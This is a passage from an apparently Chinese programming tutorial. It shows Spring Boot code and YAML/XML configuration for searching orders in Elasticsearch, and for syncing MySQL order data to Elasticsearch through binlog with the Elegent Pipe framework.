        <span class="hljs-title class_">ElegentQueryWapper</span> queryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
        queryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>)
                .<span class="hljs-title function_">eq</span>(<span class="hljs-string">"status"</span>,<span class="hljs-string">"1"</span>)
                .<span class="hljs-title function_">count</span>(<span class="hljs-string">"price"</span>).<span class="hljs-title function_">groupBy</span>(<span class="hljs-string">"sku_id"</span>);
        <span class="hljs-keyword">return</span>  orderEsService.<span class="hljs-title function_">statistics</span>(queryWapper);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/save"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">OrderDTO</span> orderDTO=<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderDTO</span>();
        orderDTO.<span class="hljs-title function_">setId</span>(200L);
        orderDTO.<span class="hljs-title function_">setAddr</span>(<span class="hljs-string">"测试地址"</span>);
        orderDTO.<span class="hljs-title function_">setStatus</span>(<span class="hljs-number">1</span>);
        orderEsService.<span class="hljs-title function_">save</span>(<span class="hljs-string">"order"</span>,orderDTO.<span class="hljs-title function_">getId</span>()+<span class="hljs-string">""</span>,orderDTO);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/update"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">OrderDTO</span> orderDTO=<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderDTO</span>();
        orderDTO.<span class="hljs-title function_">setId</span>(200L);
        orderDTO.<span class="hljs-title function_">setAddr</span>(<span class="hljs-string">"地址测试"</span>);
        orderDTO.<span class="hljs-title function_">setStatus</span>(<span class="hljs-number">2</span>);
        orderEsService.<span class="hljs-title function_">update</span>(<span class="hljs-string">"order"</span>,orderDTO.<span class="hljs-title function_">getId</span>()+<span class="hljs-string">""</span>,orderDTO);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/delete"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"/>){
        orderEsService.<span class="hljs-title function_">delete</span>(<span class="hljs-string">"order"</span>,<span class="hljs-string">"200"</span>);
    }

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/findById/{id}"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">OrderDTO</span> <span class="hljs-title function_">findById</span>(<span class="hljs-params"> <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">"id"</span>) <span class="hljs-built_in">String</span> id</span>){
        <span class="hljs-title class_">OrderDTO</span> order = orderEsService.<span class="hljs-title function_">findById</span>(<span class="hljs-string">"order"</span>, id);
        <span class="hljs-keyword">return</span> order;
    }

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-6">2.订单搜索</h2>
<h3 data-id="heading-7">2.1 需求分析</h3>
<p>用户在微信小程序中能够根据日期范围检索查询历史订单。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b07548397224bcfb5d9018bd3cee06f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=8GB3PidTOi0b2xH0ADOqebXB6BY%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>除了小程序，还有管理后台也需要订单查询功能。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7b11b093a0b4f4c81e9c0c217a230c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=quf0Q6UnVy%2FYjtURPVeAVNCUxdY%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-8">2.2 实现思路</h3>
<p>（1）在订单微服务，封装查询逻辑，通过使用<strong>ElegentData查询</strong>elasticsearch中的订单数据。</p>
<p>（2）在C端网关路由到订单微服务</p>
<h3 data-id="heading-9">2.3 代码实现</h3>
<h4 data-id="heading-10">2.3.1 订单微服务搜索功能的实现</h4>
<p>（1）在订单微服务的pom文件中，添加依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.data<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-data-elasticsearch7<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在订单微服务的配置中（配置中心），添加以下配置</p>
<pre><code class="hljs language-less" lang="less">spring:
  elasticsearch:
    <span class="hljs-attribute">rest</span>:
      <span class="hljs-attribute">uris</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.0.0.1:9201</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）创建搜索服务类 OrderEsService</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderEsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Elasticsearch7DataService&lt;OrderVO&gt;</span> </span>{

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）OrderService新增方法</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 搜索订单
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">pageIndex</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">pageSize</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">orderNo</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">openId</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">startDate</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">endDate</span>
 * <span class="hljs-doctag">@return</span>
 */</span>
<span class="hljs-title class_">Pager</span>&lt;<span class="hljs-title class_">OrderVO</span>&gt; <span class="hljs-title function_">search</span>(<span class="hljs-title class_">Integer</span> pageIndex, <span class="hljs-title class_">Integer</span> pageSize, <span class="hljs-title class_">String</span> orderNo, <span class="hljs-title class_">String</span> openId, <span class="hljs-title class_">String</span> startDate, <span class="hljs-title class_">String</span> endDate);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）OrderServiceImpl实现此方法</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderEsService</span> orderEsService;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">Pager</span>&lt;<span class="hljs-title class_">OrderVO</span>&gt; <span class="hljs-title function_">search</span>(<span class="hljs-params">Integer pageIndex, Integer pageSize, <span class="hljs-built_in">String</span> orderNo, <span class="hljs-built_in">String</span> openId, <span class="hljs-built_in">String</span> startDate, <span class="hljs-built_in">String</span> endDate</span>) {
    <span class="hljs-title class_">ElegentQueryWapper</span> elegentQueryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
    elegentQueryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>);
    <span class="hljs-keyword">if</span>(orderNo!=<span class="hljs-literal">null</span>){
        elegentQueryWapper.<span class="hljs-title function_">eq</span>(<span class="hljs-string">"order_no"</span>,orderNo);
    }
    <span class="hljs-keyword">if</span>(openId!=<span class="hljs-literal">null</span>){
        elegentQueryWapper.<span class="hljs-title function_">eq</span>(<span class="hljs-string">"open_id"</span>,openId);
    }
    <span class="hljs-keyword">if</span>(startDate!=<span class="hljs-literal">null</span> &amp;&amp; endDate!=<span class="hljs-literal">null</span>){
        elegentQueryWapper.<span class="hljs-title function_">between</span>(  <span class="hljs-string">"create_time"</span>,startDate, endDate  );
    }
   <span class="hljs-keyword">return</span> orderEsService.<span class="hljs-title function_">page</span>(elegentQueryWapper, pageIndex, pageSize);
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（6）OrderController调用 service的search方法</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 搜索
 * @param pageIndex
 * @param pageSize
 * @param orderNo
 * @param openId
 * @param startDate
 * @param endDate
 * @return
 */</span>
<span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/search"</span>)
public Pager&lt;OrderVO&gt; <span class="hljs-built_in">search</span>(
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"pageIndex"</span>,required = false,defaultValue = <span class="hljs-string">"1"</span>) Integer pageIndex,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"pageSize"</span>,required = false,defaultValue = <span class="hljs-string">"10"</span>) Integer pageSize,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"orderNo"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String orderNo,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"openId"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String openId,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"startDate"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String startDate,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"endDate"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String endDate){
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.search</span>(pageIndex,pageSize,orderNo,openId,startDate,endDate);
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-11">2.3.2 C端网关路由配置</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
      <span class="hljs-comment">#订单微服务</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">order</span>
        <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://order-service</span>
        <span class="hljs-attr">predicates:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/order/**</span>
        <span class="hljs-attr">filters:</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-12">2.4 测试</h3>
<p>VSCODE的测试脚本</p>
<pre><code class="hljs language-css" lang="css">GET http://{{hostname}}:{{port}}/<span class="hljs-attribute">order</span>/search?pageIndex=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;openId=oJ9WJ5MhIS-hiwuUX0GmsHDzqTyQ&amp;startDate=<span class="hljs-number">2020</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span>&amp;endDate=<span class="hljs-number">2023</span>-<span class="hljs-number">12</span>-<span class="hljs-number">31</span> HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-attribute">Content</span>-Type: {{contentType}}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-13">3. 数据同步技术</h2>
<p>我们现在已经实现了ES数据的查询功能，但是ES数据从哪里来呀？这就需要数据同步技术实现数据从Mysql到ES的搬运。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7253a186b274e8b993929be85b8f02f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=9sICyHlwrTQARGDxLT0VWpQ3Pic%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-14">3.1 技术方案选型</h3>
<h4 data-id="heading-15">3.1.1 MQ异步通知</h4>
<p>MQ（消息队列）异步通知是一种常见的异步通信模式，用于在分布式系统中实现解耦和异步处理。它通过将消息发送到消息队列中，然后由消费者从队列中获取消息并进行处理，实现了消息的异步传递和处理。</p>
<p>我们可以在数据的增删改方法操作上，发送数据MQ， 消费者接受数据后进行数据的同步处理。</p>
<h4 data-id="heading-16">3.1.2 canal</h4>
<p>阿里的Canal是一种开源的分布式数据库复制与实时数据订阅系统。它由阿里巴巴集团开发，旨在解决大规模分布式数据库的数据同步和实时数据订阅的需求。</p>
<p>Canal基于MySQL的主从复制原理，通过解析MySQL的binlog日志来实现数据的增量订阅和同步。它支持多种订阅方式，包括基于数据库表的增量订阅、基于全局事务的增量订阅以及基于时间点的全量订阅。Canal可以将数据库的变更数据实时地推送给订阅者，使得订阅者能够实时获取到数据库的最新数据。</p>
<h4 data-id="heading-17">3.1.3 Elegent Pipe</h4>
<p>传智教育研究院研发的一款数据同步框架。它的实现原理与Canal是类似的，都是基于MySQL的主从复制原理，通过解析MySQL的binlog日志来实现数据的增量订阅和同步。与Canal不同的是，Elegent Pipe 是分为服务端和客户端两个部分，服务端处理监听后，通过ElegentAC将数据库变动的内容发送给客户端，所以ElegentPipe 更适合微服务架构应用程序的开发。</p>
<p>开源项目地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fchuanzhiliubei%2Felegent-pipe" title="https://gitee.com/chuanzhiliubei/elegent-pipe" target="_blank" ref="nofollow noopener noreferrer">gitee.com/chuanzhiliu…</a></p>
<h3 data-id="heading-18">3.2 Elegent Pipe快速入门</h3>
<h4 data-id="heading-19">3.2.1 开启binlog</h4>
<p>mysql8是默认开启binlog的 ，mysql5.7默认不开启.</p>
<p>我们可以通过以下命令查看binlog是否开启</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%log_bin%'</span>;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>要开启MySQL的binlog，您可以按照以下步骤进行操作：</p>
<ol>
<li>编辑MySQL的配置文件 <code>my.cnf</code> 或 <code>my.ini</code>，具体位置根据您的操作系统和MySQL版本而定。</li>
<li>找到并修改以下参数：</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">log-bin</span>=mysql-bin
<span class="hljs-attr">server-id</span>=<span class="hljs-number">1</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<ul>
<li>
<ul>
<li><code>log-bin</code>：指定binlog日志文件的前缀名称，可以根据需要自定义。</li>
<li><code>server-id</code>：指定MySQL实例的唯一标识，每个MySQL实例需要有不同的server-id。</li>
</ul>
</li>
</ul>
<ol>
<li>保存并退出配置文件。</li>
<li>重启MySQL服务，以使配置生效。</li>
</ol>
<p>开启binlog后，MySQL将开始记录所有的数据库更改操作，并将其写入binlog文件中。这些binlog文件可以用于数据恢复、数据备份、数据同步等用途。</p>
<p>请注意，在修改MySQL配置文件之前，请确保您对MySQL有足够的权限，并且备份了重要的数据。此外，开启binlog会增加MySQL的写入负载，因此在生产环境中，应该根据系统的性能和资源情况进行评估和调整。</p>
<h4 data-id="heading-20">3.2.2 代码实现</h4>
<p>（1）在服务端的工程引入依赖 （由于ElegentPipe依赖ElegentAC，所以还要引入elegent-AC-mqtt ）</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.ac<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-AC-mqtt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在服务端的配置引入依赖</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">pipe:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">3306</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">passwd:</span> <span class="hljs-string">HuangShu_2023</span>
    <span class="hljs-attr">tables:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">demo:users</span>
  <span class="hljs-attr">ac:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">1883</span>
    <span class="hljs-attr">clientId:</span> <span class="hljs-string">transmitServer</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">admin</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">public</span>
    <span class="hljs-attr">keepAliveInterval:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">connectionTimeout:</span> <span class="hljs-number">60</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8888</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）在客户端工程引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.ac<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-AC-mqtt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）在客户端工程的配置文件添加</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">ac:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">1883</span>
    <span class="hljs-attr">clientId:</span> <span class="hljs-string">transmitClient</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">admin</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">public</span>
    <span class="hljs-attr">keepAliveInterval:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">connectionTimeout:</span> <span class="hljs-number">60</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）在客户端工程添加类用于处理数据增删改之后的操作</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@ElegentPipe</span>(db=<span class="hljs-string">"demo"</span>,table = <span class="hljs-string">"users"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTransmit</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PipeService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">insertHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改前数据："</span>+transmitDTO.<span class="hljs-title function_">getBefore</span>());
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改后数据："</span>+transmitDTO.<span class="hljs-title function_">getAfter</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改前数据："</span>+transmitDTO.<span class="hljs-title function_">getBefore</span>());
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改后数据："</span>+transmitDTO.<span class="hljs-title function_">getAfter</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">deleteHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改前数据："</span>+transmitDTO.<span class="hljs-title function_">getBefore</span>());
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改后数据："</span>+transmitDTO.<span class="hljs-title function_">getAfter</span>());
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-21">3.2.3 常见错误</h4>
<p>Java监听mysql的binlog 报错解决办法</p>
<p>报错：com.github.shyiko.mysql.binlog.network.AuthenticationException: Client does not support authentication protocol requested by server; consider upgrading MySQL client</p>
<p>这是你的mysql认证规则不正确导致的。</p>
<p>解决方案：在mysql中执行以下命令</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'localhost'</span> identified <span class="hljs-keyword">with</span> mysql_native_password <span class="hljs-keyword">by</span> <span class="hljs-string">'密码'</span>;  <span class="hljs-comment">--修改认证规则</span>
flush privileges; <span class="hljs-comment">--刷新权限</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-22">4. 订单数据同步</h2>
<h3 data-id="heading-23">4.1 需求分析</h3>
<p>将订单库中的订单表数据，同步到ES中</p>
<h3 data-id="heading-24">4.2 实现思路</h3>
<p>（1）创建数据同步的服务端模块，引入elegent-pipe-server以及Springboot依赖</p>
<p>（2）在服务端模块配置文件中，配置监听dkd_order库的tb_order表。</p>
<p>（3）在订单微服务引入elegent-pipe-client</p>
<p>（4）编写数据处理类，接收数据，并通过Elegent Data Elasticsearch将数据保存到 elasticsearch中。</p>
<h3 data-id="heading-25">4.3 代码实现</h3>
<h4 data-id="heading-26">4.3.1 构建数据同步服务</h4>
<p>（1）创建dkd_pipe_service模块,Pom文件引入elegent-pipe-server以及Springboot依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.ac<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-AC-mqtt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）创建配置文件 application.yml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">pipe:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">3306</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">passwd:</span> <span class="hljs-string">HuangShu_2023</span>
    <span class="hljs-attr">tables:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dkd_order:tb_order</span>
  <span class="hljs-attr">ac:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">1883</span>
    <span class="hljs-attr">clientId:</span> <span class="hljs-string">transmitServer</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">admin</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">public</span>
    <span class="hljs-attr">keepAliveInterval:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">connectionTimeout:</span> <span class="hljs-number">60</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">pipe-service</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8999</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）添加启动类</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransmitServerApplication</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>){
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">TransmitServerApplication</span>.<span class="hljs-property">class</span>, args);
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-27">4.3.2 同步逻辑的实现</h4>
